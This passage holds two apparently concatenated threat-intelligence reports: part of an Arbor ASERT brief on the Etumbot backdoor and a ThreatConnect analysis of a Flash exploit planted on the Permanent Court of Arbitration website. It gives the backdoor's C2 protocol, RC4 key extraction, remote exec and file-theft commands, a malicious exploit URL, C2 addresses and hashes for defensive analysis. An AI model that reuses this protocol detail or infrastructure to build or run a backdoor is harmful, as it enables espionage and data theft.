import base64 c2_response= '' '' '' AQAAAAAAAABlNjV3YjI0bjUAAAAAAAAAAAAAAG5FAVBvIz8hYk08ITI4BA0lMTBvBRx0NB18 BndMcFMKQhR5PxxkQ3VnFEALeXA6C3RPBmJLHBBccHQINEl9I3kMUk0lOT4wCFgqD3khTjl5IEAqGzU_DmtU eEJBYSQHEiwRADteMEFjTw5oXgtjGkUxL14JPlwyYQQXPkVaQiAyUBEaJWlkOQEmZRoXZ10EN3RndH0kbEEre w0NUklhFRlpNDJofS1hPQMCeWUvHSQPA2ZAPHEcCRkLPURbCC8bdTgIXXcIBhBbVlhjdB8iL2Y_TCNldTNjZkE vB0M5BWtaOkBALj4KIA5UBjhVPxhhSk1fAwdKKi8zdhl6TkthRUZAOQdICRgFEgY0dwpQNjtlQgR8DzM9N3NQ BhteHgdwaVtycDZvS1Q3CTYhARI1GBMrWh1FQxcdQhV7MSx+NQxqFHgVKHRAdBIBIzNFP14gLHErBAYeWH 1jGCMAdlx5MWAuFk5TW3M+UxFMclIsclEAbzgzB2NSOX0iYBBucmthDyYaZR8tBBMbJjMoCXleMkM+YjdfCHc xIUBHbic+RiEeNwAvWD40W2p0diUyCTJHFEU+KRc+ZFVJTA0zHgxwAiJva306KXkIL3ZnRwAIKCh4M3sgFgZ ZGU9lFXg4ancZFSAlNl1RaRQ8b3drCWofbWB+fkIyKEJ8AnJlaUAxEglWZSM+TWFEAE4aCnFpe1JpB1xTBSgfE UwVUh1UDE5UVC1qanIcXXlfcmRzdWkPK2doDlBhVmx4dm8zUkFgMWJHdRhzRSdrKwk_KWAadyAqMEg2MlE YNVl9Wl84bQtVcRYpFHAXGg8kQiI6E1xiBApHV3ZDLBY+G2sADmJXUC9OCixmBEYUNGBXATh0QVxUNTwyQ nhbXRxNTHlCEAlYBXhyTWdyQRcNBxskBRlRBn42HlhNbEtnJCk4QkIoDzRbEChGLi10ERpgZTpNNCJjKEUNOhh lcRR1Dkw+ITMAYAleCDQdTVpTHGQbXwktTmROQiooaEtLLHcILTo4an08I1p9H2IPeBseLiUScQp3Xg `` `` '' .replace ( ' _ ' , '/ ' ) .replace ( '- ' , '= ' ) c2_response=base64.b64decode ( c2_response ) rc4_key = c2_response [ 8:8+c2_response [ 8 : ] .find ( '\x00 ' ) ] print rc4_key e65wb24n5 .
While a payload of 1080 bytes is sent back , the majority appears to be random padding .
Once the bot has received the encryption key , the bot sends a registration callback to the C & C /image/ < encrypted data > .jpg containing the encrypted values of system information to include the NetBIOS name of the system , user name , IP address , if the system is using a proxy ( Yes/No ) , and a numeric value which may be some type of campaign code .
IXESHE malware has also been observed using a unique campaign code that is delivered back to the C & C .
[ 7 ] .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
5 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Etumbot discovers the proxy settings of the local machine .
If a proxy is defined , communications to the C & C bypass the proxy and go directly to the Internet .
Environments with system-defined proxies won ’ t get this activity in proxy logs , however transparent proxies may see this activity .
A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows : WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| .
A bot registration call to /image .
Once the bot has registered with the C & C , it will send periodic pings to ask for new commands to execute .
The URI for the ping requests is /history/ < encrypted NetBIOS name > .asp , where encrypted NetBIOS name is the url-safe base64 encoding of the rc4-encrypted NetBIOS name .
6 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Etumbot Command Structure .
The first eight bytes of C & C responses to the bot include the command , and the second eight bytes contain an ASCII string that is parsed .
In the event of a file download , file upload , or command execution , the second eight bytes contain the filename or command to be executed .
The parsing function inside the binary reveals at least five commands :
Etumbot function Command name Internal code Execute arbitrary command ETUM_CMD_EXEC 3 Download file from C & C ETUM_CMD_PUTFILE 4 Upload file from bot to C & C ETUM_CMD_READFILE 5 Pause execution ETUM_CMD_SLEEP 7 Delete backdoor binary and ETUM_CMD_UNINSTALL 8 terminate program Ping the C & C ETUM_CMD_PING 9 .
ETUM_CMD_EXEC provides the capability for the attacker to run any command on the compromised hosts .
Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the C & C using a separate thread that spawned during initialization .
In the event of a process creation or hang error , an HTTP transaction to /tech/s.asp/m= .
is sent to the C & C , where .
contains .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
7 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
a create process error statement “ CreateProcess Error : % d ” or a message that states “ Process Do not exit in 10 second , so i Kill it ! ” .
Some samples of droppers have been observed using the string “ Process Do not cunzai in 10 second , so i Kill it ! ” .
The word `` cunzai ” is likely the pinyin ( romanization ) for the Mandarin word 'exist ' .
ETUM_CMD_PUTFILE provides the capability for files to be placed on local system from the C & C .
The file upload is accomplished by sending a request to /docs/name= .
and the C & C is expected to respond with the full contents of the file as the response payload .
A success or failure status message is relayed via a call to /tech/s.asp ? m= < encrypted status message > with various reasons for failure potentially being relayed .
ETUM_CMD_READFILE allows any file from the compromised system to be uploaded to the C & C .
When a READFILE command is received from the C & C , the bot makes an initial call to /manage/asp/item.asp ? id= < encrypted computer name > & & mux= < encrypted total file size > and checks for the presence of “ I ’ m Ready ” in the response from the C & C .
Data from the file is read in 2000 byte chunks , RC4 encrypted and then url-safe base64 encoded .
The data is sent back to the C & C via the URI /article/30441/Review.asp ? id= < encoded computer name > & & date= < file chunk data > .
The bot expects a message of “ OK ” from the C & C after each response is sent and will terminate the upload and send an error message to the C & C in the case it is not seen .
A success or failure message is sent via the /tech/s.asp ? m= < encrypted status message > to complete or terminate the upload .
ETUM_CMD_SLEEP puts the bot into a dormant state for a period of time .
When a bot receives the sleep command , it will relay the message , “ I will sleep % d minutes ! ” via a call to /tech/s.asp ? m= < encrypted message > .
ETUM_CMD_UNINSTALL deletes the binary and terminates the process with no additional communication to the C & C .
Use of Byte Strings Technique ( aka “ String Stacking ” ) .
Etumbot uses a technique to load strings into memory that has been called “ byte strings ” and also “ string stacking ” whereby character values are loaded into a specific memory location one byte at a time .
Assuming the string values do not change frequently , these byte strings can make for meaningful detection capabilities , such as discovering an unusual combination of characters ( to include typos , unique or odd syntax ) being loaded into memory that creates a unique fingerprint for the malware activity that can be used as part of a yara rule or other detection mechanism .
The byte string technique has been observed in various Chinese APT malware , including Gh0st RAT , IXESHE malware , Etumbot and others .
ASERT has provided an IDApython script that will provide for cleaner analysis of such strings as well as a corresponding blog entry that describes the obfuscation technique and code .
[ 8-9 ] The output of running find_byte_strings.py on an Etumbot backdoor shows the string “ I ’ m Ready ” which is involved in file transfer routines .
The first screenshot shows the default hex byte values that are MOVed into offsets from EBP , and the second screenshot shows those same characters after translation to string values .
8 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
9 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Two additional screenshots provide insight into all of the strings discovered .
The byte string technique has also been observed in other malware , so its presence alone does not specifically indicate the activities of Chinese threat actors .
An interesting artifact occasionally observed during analysis is the presence of a numeric value just after an IP address used as a C & C .
The placement of this number after a colon suggests the use of a port value , however such a port value is too high to be valid .
An example of this taken from an Etumbot sample performing an initial beacon is as follows :
10 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Etumbot Backdoor Related File System Artifacts of Interest .
Filename Purpose Notes ka4281x3.log Temporary file for data exchange Observed in various IXESHE malware variants as well as from C & C Etumbot .
File is stored in C : \Windows\system32\ , \Documents and Settings\ .
or elsewhere ka4a8213.log Temporary file for data exchange Similar in format to the prior filename , this has only from C & C been observed in Etumbot samples .
kb71271.log Temporary file for data exchange Observed in various IXESHE malware variants as well as from C & C , to include registry file Etumbot ~DA5E74.doc Distraction documents Contains a variety of document content , often obtained ~DS5D64.doc from other sources that will be of interest to the target ~t3fcjl.doc ~g4h710.doc ~gh4710.pdf ~trfai3.doc ~tresd2.xls ~taste3.doc ~tasyd3.xls ~tkfad1.xls ntprint.exe Backdoor binary The Etumbot backdoor binary itself which is added to conime.exe the registry for persistent execution JavaSvc.exe serverupdate.exe wscnsvr.exe spoolvs.exe winlogdate.exe tst1.tmp Observed in IXESHE malware and Etumbot samples as tst2.tmp well as in other malware .
The file tst3.tmp is more tst3.tmp popular than the other two file names and is used in a wider variety of malware Locations Directory created Created in \Documents and JAVA Settings\ .
\Application Data\ and also in root of C : \ directory .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
11 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Etumbot Command and Control Indicators .
Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address hardcoded in the binary .
These C & C ’ s were obtained from analyzing malware samples compiled over a period of several years .
IP Address Domain Name Country 200.27.173.58 CL 200.42.69.140 AR 92.54.232.142 GE 133.87.242.63 .
1 .
JP 98.188.111.244 intro.sunnyschool.com.tw US 143.89.145.156 .
2 .
HK 198.209.212.82 .
3 .
US 143.89.47.132 .
2 .
HK 196.1.99.15 .
4 .
wwap.publiclol.com SN 59.0.249.11 KR 190.16.246.129 AR 211.53.164.152 finance.yesplusno.com KR .
A number of these C & C IP addresses are also used by IXESHE-related malware , which seems to indicate that Etumbot is often used in tandem with IXESHE .
The domain finance.yesplusno.com and IP address 211.53.164.152 was also used by a variety of IXESHE samples , for instance .
The registrant for the domain yesplusno.com is listed as “ alice yoker ” wit the email address “ chuni_fan@sina.com ” .
Other domains registered in this name have also been used as C & C for IXESHE : securezone.yesplusno.com [ 10 ] prishmobile.googlesale.net yahoopush.googlesale.net The IP address 98.188.111.244 has also been used as a C & C for multiple IXESHE samples , beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample .
This is the IP address for what appears to be a legitimate website for a school in Taiwan : intro.sunnyschool.com.tw .
Note that if HTran or other connection bouncer is used , the C & C may be a legitimate site that was simply compromised and used to direct traffic elsewhere .
Miscellaneous Network Artifacts : Use of Htran Connection Bouncer .
Indicators suggest that HTran , a connection bouncer , is being used in some cases such as on the C & C contacted by malware sample MD5 : 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 , 2014 ) .
The presence of HTran is based on the following response string .
[ SERVER ] connection to ss : dd error .
1 IP address allocated to Hokkaido University 2 IPs allocated to Hong Kong University of Science and Technology 3 IP allocated to the University of Missouri 4 IP allocated to the University Saint-Louis of Senegal .
12 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
HTran is also called `` HUC Packet Transmit Tool '' , developed by a member of the Honker Union of China , a hacker group ; the source code for the program is available online .
[ 11 ] HTran is designed to redirect TCP traffic intended for one host to another , and has been used by IXESHE malware previously .
[ 2 ] Researchers at SecureWorks determined some years back that HTran would deliver the IP address of the final destination server if the final server were down or unreachable .
The code in use here has been modified to not reveal such information .
Organizations properly positioned with netflow or other traffic analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial tier of C & C .
Htran activity can be detected with the following signature : ET CURRENT_EVENTS HTran/SensLiceld.A response to infected host The import hash for the sample observed connecting to an Htran bouncer is a9059c354e5025dfe4f1c0b8b57e4f62 which links to other Etumbot samples compiled with Microsoft Visual C++ 5.0 in a similar March 2014 timeframe : • 4c703a8cfeded7f889872a86fb7c70cf 2014-03-24 • ff5a7a610746ab5492cc6ab284138852 2014-03-04 .
Etumbot Campaign Timeline .
The following samples have been identified by ASERT as Etumbot malware .
The first identified sample has a compilation date of March 2011 , while the most recent was compiled in May 2014 .
Many droppers/installers contain Etumbot or , alternatively , IXESHE-related backdoors .
Most of the documents dropped with Etumbot are written in traditional Chinese .
Traditional Chinese ( versus simplified Chinese used in mainland China ) is most widely used in Taiwan .
While other areas do make use of traditional Chinese ( Hong Kong , Macau ) , the topics of the decoy documents strongly suggest that Taiwanese entities are the targets for many Etumbot samples .
A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the Numbered Panda/IXESHE group has increased activity lately or has begun using Etumbot more widely in targeted campaigns .
2011 .
ac22aa007081caeb8970aefba7eddfcf Compilation Date : 2011-03-09 14:10:34 C & C : N/A Filename : Help statement from western U.S ? cod.scr Archive : HelpXstatementXfromXwesternXU.SX .rar ( c2d667b8072aa2eaa670d4459dd7c90d ) Dropped Files : ~ $ workp.doc ( 7ec4ece7358f9f67a4d583777dc1fb59 ) , ka4281x3.log , kb71271.log , WINCHAT.EXE ( 70424b91dc905e4ca5e4aeb1c62ed91f ) .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
13 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
~ $ workp.doc : News article on recent Chilean earthquake ( English ) .
cd33c5467d425f662f57672531701d89 Compilation Date : 2011-03-14 02:49:22 C & C : N/A Filename : N/A Dropped Files : ~ $ workp.doc ( 731f288ebd8ff05b3a32377d9d7f4751 ) , WINCHAT.exe ( e62453f41af9d87b4f6d4e8223926024 ) .
~ $ workp.doc : Notice from TEPCO ( Tokyo Electric Power Company ) dated March 14 about emergency shortage and blackouts .
( Japanese ) .
04908c6853cb5c9d7dccaf15fb5fd3bb Compilation Date : 2011-03-24 03:24:42 C & C : 32.114.251.129 ( US ) , 217.119.240.118 ( RS ) , 202.106.195.30 ( CN ) larry.yumiya.com .
14 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
Filename : N/A Dropped Files : ~ $ workp.doc ( 4d47f52c675db16ab1e1df5ac050d3b8 ) , ka4281x3.log , kb71271.log , WINCHAT.exe ( 47ee9a497a12272b50bb5e197935f13f ) .
~ $ workp.doc : “ Investigation Results ” of several cases/laws involving the Ministry of National Defence ( Traditional Chinese ) .
2012 .
232b659e28c5e06ad5466c01aec35cb6 Compilation Date : 2012-09-19 08:53:14 C & C : 200.27.173.58 ( CL ) Filename : N/A Dropped Files : ka3157j.log , W3svc.exe ( 1e838fd06bcc64c54e75c527df164d91 ) 7a698acebcf19b55170f05388a2f7fe0 Compilation Date : 2012-10-12 01:21:11 C & C : N/A Filename : N/A Dropped Files : ka3158jl.log , iexplore.exe ( ac7f77cc55c964e400b8926f21bed7d2 ) 1e8fba674761371cb9e88962dcb851c0 Compilation Date : 2012-11-20 00:11:02 C & C : 211.53.164.152 ( KR ) , finance.yesplusno.com Filename : N/A Dropped Files : ~PG7953.doc ( adc0ffd684d9a986d65cb4efba39c3fe ) , ka3157jl.log , kb71271.log , iexplore.exe ( 37648553f4ee6c5cb712cca446340a9a ) .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
15 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
~PG7953.doc : “ qqqqqq ” .
88653dde22f723934ea9806e76a1f546 Compilation Date : 2012-12-05 01:30:07 C & C : 190.193.44.138 ( AR ) , cht.strangled.net Filename : N/A Dropped Files : N/A ( this sample is a dropped backdoor ) 2b3a8734a57604e98e6c996f94776086 Compilation Date : 2012-12-05 02:13:27 C & C : 92.54.232.142 ( GE ) Filename : 補捐助案件結餘款處理調查表.doc .exe Dropped Files : ~DS5D64.doc ( 2454c4af0b839eb993dd1cbb92b2c10d ) , ka4281x3.log , conime.exe ( 3214bf22eb28e494b8e23d8ffc5ac4a9 ) .
~DS5D64.doc : Form pertaining to unspecified investigation/case ( Traditional Chinese ) .
16 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
1498c9761fc819d496171c71604c2128 Compilation Date : 2012-12-11 02:26:18 C & C : N/A Filename : 部會文宣聯繫名單 cod.scr Dropped Files : ~DS5D64.doc ( e8b92d20a9c4718b4f90d27cd8cba4b3 ) , conime.exe ( 0bfb9f2080aeee22d3b4ca6fbfd25980 ) .
~DS5D64.doc : Application to apply as a member of the “ Taiwan National Alliance ” ( Traditional Chinese ) .
063b6076c69ce3ba4f116d1ad51da2b5 Compilation Date : 2012-12-12 01:26:54 C & C : N/A Filename : N/A Dropped Files : ~PG7953.doc ( c4af36f64d515569816263ca48f61899 ) , ka3157jl.log , iexplore.exe ( 5b15664fb744c3f3cf7ec7b5515d2be5 ) .
~PG7953.doc : Foreign Ministry : Security Operation Center Plan ( Traditional Chinese ) .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
17 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
2013 .
ca838b98ca0f516858a8a523dcd1338d Compilation Date : 2013-07-25 07:48:29 C & C : 143.89.145.156 ( HK ) Filename : N/A Dropped Files : ~g4h710.doc ( 729353afd095ca07940490dbb786ee33 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( 36b42162c818cf6c2fb22937012af290 ) .
~g4h710.doc : “ The 2013 Turning Point : Blazing a Trail for Taiwan 's Economy ” Conference at the Taipei International Convention Center 2013-07-30 ( Traditional Chinese ) .
986937eb4052562cdd3960dd8fffc481 Compilation Date : 2013-07-30 08:22:06 C & C : 200.42.69.140 ( AR ) Filename : N/A Dropped Files : ~g4h710.pdf ( 7cd7db8ff8071d590567c68ea0219f23 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) .
18 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
~g4h710.pdf : the Industrial Technology Research Institute ( Taiwan ) , 2013 Cross Strait Communication Industry Cooperation and Exchange Meeting ( 2013-07-15 ) ( Traditional Chinese ) .
5ef508d0ca7759ecf602192521fff287 Compilation Date : 2013-08-01 00:47:08 C & C : 200.42.69.140 ( AR ) Filename : N/A Dropped Files : ~t4hhk0.pdf ( 6b7cbcabd963ee4823dd2cd9daa5fcc7 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) .
~t4hhk0.pdf : Cross Straits Strategic Emerging Industry Cooperation and Development Forum ( 2013-08-14 ) ( Traditional Chinese ) .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
19 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
2014 .
ff5a7a610746ab5492cc6ab284138852 Compilation Date : 2014-03-04 00:19:59 C & C : 98.188.111.244 ( US ) ͧ Filename : WTO^XPiii20140303 slx.scr Dropped Files : ~t3fcj1.doc ( 361a6752766c154c6e31a4d9cc3a3fdc ) , kb71271.log , ka4281x3.log , JavaSvc.exe ( 82d4850a02375a7447d2d0381b642a72 ) .
~t3fcj1.doc .
1ce47f76fca26b94b0b1d74610a734a4 Compilation Date : 2014-03-12 01:38:44 C & C : 133.87.242.63 ( JP ) Filename : APO EPIF 邀請函 rcs.xls Dropped Files : ~tresd2.xls ( 2e073d35934bb3920fe9907ccb7bc5f8 ) , ka4281x3.log , kb71271.log , wscnsvr.exe ( deeec10be746ecf9bf46a30bf58bc784 ) .
20 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
~tresd2.xls : International Green Fair ( EPIF ) , held in Taiwan March 13-16 , 2014 ( Traditional Chinese ) .
4c703a8cfeded7f889872a86fb7c70cf Compilation Date : 2014-03-24 00:53:57 C & C : 133.87.242.63 ( JP ) Filename : 國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls Archive : .rar ( 9b42968e9a7646feb7db318713271718 ) Dropped Files : ~t3fcj1.xls ( 18dc518810892d89430a1efe2c71797e ) , ka4a8213.log , kb71271.log , serverupdate.exe ( fed7ce0d20e78b5814475d8f9d062c80 ) .
~t3fcj1.xls : Filename ( Traditional Chinese ) pertains to a Taiwan National Development Council meeting , document is unreadable .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
21 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
beb16ac99642f5c9382686fd8ee73e00 Compilation Date : 2014-03-31 07:34:00 C & C : 143.89.47.132 ( HK ) Filename : 10342 委會-審查金融法規修正草案報告 rcs.xls Dropped Files : ~tkfad1.xls ( eef5f9b46676b31a791216b42360c8bb ) , ka4a8213.log , kb71271.log , Googleupdate.exe ( e7d960060d602deb53c7d49d2002c4a4 ) .
~tkfad1.xls : Filename ( Traditional Chinese ) pertains to April 2 meeting of unnamed Commission about financial regulation amendments .
Document format is unreadable .
5340fcfb3d2fa263c280e9659d13ba93 Compilation Date : 2014-04-23 01:23:41 C & C : 196.1.99.15 ( SN ) , wwap.publiclol.com Filename : 報價單 Finarcs.xls Dropped Files : ~tasyd3.xls ( c5118ba47b7aa12d6524f648f1623cc1 ) , ka4a8213.log , kb71271.log , winlogdate.exe ( ba4f88fe44d02a299dbeab18c37f74f3 ) .
~tasyd3.xls : Filename “ price list ” ( Traditional Chinese ) .
Document format is unreadable .
22 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
a6b4b679a51627ce279d5107c20dd078 Compilation Date : 2014-04-29 03:44:19 C & C : 59.0.249.11 ( KR ) Filename : spoolv.exe Dropped Files : N/A ( this sample is a dropped backdoor ) d444be30d2773b23de38ead1f2c6d117 Compilation Date : 2014-05-14 13:34:46 C & C : 198.209.212.82 ( US ) Filename : 1030522 新機關籌備小組清單 rcs.DOC Archive : 1030522 新機關籌備小組清單.7z ( 75193fc10145931ec0788d7c88fc8832 ) Dropped Files : ~trfai3.doc ( 196ae8d6a5d19737ae6975d047ab1d59 ) , ka4a8213.log , kb71271.log , sysupdate.exe ( 86ef188537f5e4637df24336c9b21cb0 ) .
~trfai3.doc : List of Convener , Deputy Convener , and Executive Secretary names for various government departments ( Traditional Chinese ) .
b3830791b0a397bea2ad943d151f856b Compilation Date : 2014-05-14 08:16:41 C & C : 198.209.212.82 ( US ) Filename : 招標規範 Finarcs.doc Archive : 招標規範.rar ( 8629b95f9e0898793e0881a8f79ee0cf ) Dropped Files : ~taste3.doc ( aeaf1e78c2082644b122bf32803acb1f ) , ka4a8213.log , kb71271.log , spoolvs.exe ( 5eba8ced8656da865f91d5fc87e8dc74 ) .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
23 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
~taste3.doc : Sun Yat-Sen University ( Taiwan ) purchase list , items include Cisco3045E/K9 or equivalent ( Traditional Chinese ) .
List of Identified Etumbot MD5s .
ca838b98ca0f516858a8a523dcd1338d 986937eb4052562cdd3960dd8fffc481 5ef508d0ca7759ecf602192521fff287 d08c54ed480c9cd8b35eab2f278e7a28 82d4850a02375a7447d2d0381b642a72 4c703a8cfeded7f889872a86fb7c70cf 063b6076c69ce3ba4f116d1ad51da2b5 232b659e28c5e06ad5466c01aec35cb6 1e8fba674761371cb9e88962dcb851c0 7a698acebcf19b55170f05388a2f7fe0 ff5a7a610746ab5492cc6ab284138852 cd33c5467d425f662f57672531701d89 1ce47f76fca26b94b0b1d74610a734a4 ac22aa007081caeb8970aefba7eddfcf 1498c9761fc819d496171c71604c2128 2b3a8734a57604e98e6c996f94776086 9b42968e9a7646feb7db318713271718 04908c6853cb5c9d7dccaf15fb5fd3bb d444be30d2773b23de38ead1f2c6d117 86ef188537f5e4637df24336c9b21cb0 e7d960060d602deb53c7d49d2002c4a4 5340fcfb3d2fa263c280e9659d13ba93 a6b4b679a51627ce279d5107c20dd078 88653dde22f723934ea9806e76a1f546 b3830791b0a397bea2ad943d151f856b beb16ac99642f5c9382686fd8ee73e00 .
China Hacks the Peace Palace : All Your EEZ ’ s Are Belong to Us .
Executive Summary .
In early July 2015 , Chinese APT actors used an Adobe Flash Player exploit within a specific webpage detailing a noteworthy international legal case between the Philippines and China .
This precedent setting legal case would be followed by many Southeast Asian nations , as well as others around the globe .
The exploit appeared on day three of the Permanent Court of Arbitration tribunal , exposing an untold number of interested parties that visited the webpage to potential exploitation .
When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .
Despite Beijing ’ s unwillingness to participate in the international arbitration and their rejection of the PCA ’ s jurisdiction , there appears to be a distinct effort to surreptitiously target those who are interested in this landmark international legal case via electronic means .
ThreatConnect has shared the details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .
Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .
Hacking the Peace Palace .
Since the revelation of an Adobe Flash Player zero day exploit exposed as part of the leaked “ Hacking Team ” arsenal on July 6th 2015 ( designated CVE-2015-5119 ) , the ThreatConnect Intelligence Research Team has been monitoring its adoption by other malicious actors that are not tied to “ Hacking Team ” .
On Thursday , July 9 , 2015 ThreatConnect observed that a CVE-2015-5119 exploit was embedded strategically within the website for the Permanent Court of Arbitration ( PCA ) , 72 hours after the exploit was disclosed publicly .
The significance of this is that the PCA is an “ intergovernmental organization providing a variety of dispute resolution services to the international community ” located at the “ Peace Palace ” within The Hague , Netherlands .
The 102-year-old Peace Palace is a historic fixture within the sphere of international law because it also houses the International Court of Justice , the principal judicial body of the United Nations , as well as other bodies and resources that uphold and support international laws and norms to which many nations adhere .
The exploit was posted to the PCA website during the first round of arguments of a notable international legal case where the Philippines is contesting Chinese territorial expansion within the South China Sea ( SCS ) , specifically challenging encroachment into the Philippines exclusive economic zone ( EEZ ) .
These arbitral proceedings were initially instituted by the Republic of the Philippines against the People ’ s Republic of China under Annex VII of the United Nations Convention on the Law of the Sea ( UNCLOS ) on January 22 , 2013 .
Two years later , on July 09 , 2015 , an attacker compromised the official PCA webpages at :
http://www.pca-cpa.org/showpage.asp?pag_id=1529 http://www.pca-cpa.org/showproj.asp?pag_id=1529 .
This exploitation was almost certainly not a random compromise of the PCA website ; rather , it occurred during the initial phase of the legal proceedings .
The exploit itself was embedded within the very pages that specifically described the legal case of The Republic of the Philippines v .
The People ’ s Republic of China .
According to URLQuery , the attackers placed a CVE-2015-5119 Flash Exploit at the malicious URL http://pic.nicklockluckydog.org/movie.swf , and altered the PCA webpages to load that URL when visited .
The domain pic.nicklockluckydog.org resolved to the IP address 192.243.116.241 ( Phoenix , Arizona , US ) at the time of initial exploitation .
IP Address 192.243.116.241 is owned by IT7 Networks , Inc. , which provides self-managed Virtual Private Server ( VPS ) infrastructure .
The attackers shifted the domain later , resolving to IP Address 108.61.117.9 ( Haarlem , Netherlands ) on Friday , July 10th , the very day that the tribunal convened in The Hague .
The malware payload associated with this exploit has been identified as MD5 : B4522D05A9E3A034AF481A7797A445EA ( Rdws.exe ) .
This payload is a dropper executable that deploys its main malware component using a dynamic link library ( DLL ) sideloading technique , where a malicious DLL is dropped alongside a legitimate program executable that will load that malicious DLL by filename .
In this instance , the attackers leveraged the legitimate Google Chrome Frame Helper executable MD5 : DFDC5B09C4DEA79EB7F5B9E4E76EECF9 ( LMS.exe ) with the malicious sideload DLL file MD5 : 2EE25DE7BD6A2705F3F8DDE0DD681E96 ( dbghelp.dll ) .
LMS.exe will load any DLL file name dbghelp.dll that is found in the same path , hence the sideloading technique .
In turn , The malicious DLL loads a backdoor binary blob MD5 : 16E5A27BD55E0B4E595C9743F4C75611 ( ticrf.rat ) .
The malware connects back to the exploit domain pic.nicklockluckydog.org as well as the subdomain ssl.nicklockluckydog.org .
The domain ssl.nicklockluckydog.org resolved to 175.45.233.205 ( Seoul , South Korea ) at the time of analysis .
ThreatConnect also uncovered a related malware sample MD5 : 5877D15215B7F398319F0DE7BA7B1947 , which was submitted to Malwr.com on July 15 , 2015 .
This malware implant matches the type used above , and leverages the C2 domains books.blueworldlink2015.net and vpn.nicklockluckydog.org .
The former domain resolves to the same Netherlands IP 108.61.117.9 which resolved pic.nicklockluckydog.org on July 10th .
blueworldlink2015.net was registered by the email address nicklock2004@aol.com , which noticeably uses the same “ nicklock ” pseudonym found in the domain nicklockluckydog.org , and uses the falsified address info “ zhongguohunansheng ” Beijing , China .
The domain nicklockluckydog.org was registered on July 9th , 2015 at 06:22Z by a Chinese domain reseller using falsified information such as the name Lanny Chen and address 7946 N Bridle Creek Way in Xiamen , Taiwan .
On an interesting note , the registration address 7946 N Bridle Creek Way is the same observed within a civil suit between the National Football League and various Chinese domain resellers originally filed in May 2014 .
Conclusion .
In early July 2015 , Chinese APT actors would operationalize an Adobe Flash Player exploit within 72 hours of its public disclosure , strategically staging it within a specific webpage detailing a noteworthy international legal case between the Philippines and China .
This precedent setting legal case would be followed by many Southeast Asian nations , as well as those around the globe .
The exploit appeared during the first round of hearings , exposing an untold number of interested parties that visited the webpage .
The tactic of leveraging strategic website compromises with patched or unpatched exploits is a well known observable which has been used consistently by various APT groups in recent years .
When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .
Manila has long recognized they are unable to independently lock horns with China diplomatically or militarily , by invoking dispute settlement procedures under the UNCLOS , an agreement in which both China and the Philippines are signatories .
The Philippines is seeking to leverage international law to level the playing field against China ’ s regional diplomatic and military dominance , the ultimate goal being to deter aggressive Chinese expansion activities within the Philippine EEZ and the broader South China Sea .
Despite Beijing ’ s unwillingness to participate in the international arbitration and their rejection of the PCA ’ s jurisdiction , there appears to be a distinct effort to surreptitiously monitor those who are interested in this landmark international legal case via electronic means .
This vignette also highlights the critical difference between threat data and threat intelligence .
The latter goes beyond simply pulling in a stream of open source indicators and blindly pushing them to your enterprise network security devices and SIEM tools hoping something hits ( it works great ; you ’ ll get TONS of hits…or misses , depending on your perspective ) .
A true Threat Intelligence Platform enables tactical , operational , and strategic analysis of the details behind the technical how within the context of the non technical , socio-political why .
ThreatConnect has previously shared Threat Intelligence research of espionage activity tied to the increasing tensions within the South China Sea .
In a similar fashion , ThreatConnect has shared additional details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .
